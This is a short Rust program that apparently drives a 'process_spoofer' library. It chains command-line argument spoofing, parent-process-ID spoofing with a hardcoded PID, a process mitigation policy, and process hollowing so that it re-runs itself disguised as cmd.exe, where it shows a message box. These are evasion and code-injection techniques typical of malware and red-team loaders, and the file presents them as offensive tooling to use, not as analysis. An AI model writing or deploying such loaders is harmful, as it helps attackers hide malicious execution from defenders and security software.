use process_spoofer::{spoof_arguments, spoof_ppid, apply_process_mitigation_policy, process_hollowing, get_current_filename};
use windows::{core::s, Win32::{Foundation::HWND, UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE}}};

fn main() {
    let filename = get_current_filename();
    if filename.contains("cmd.exe") {
        unsafe { MessageBoxA(HWND::default(), s!("Text"),s!("Title"), MESSAGEBOX_STYLE(0x00000040)) };
        return
    }
    spoof_arguments();
    spoof_ppid(5868);
    apply_process_mitigation_policy();
    process_hollowing(filename);
}
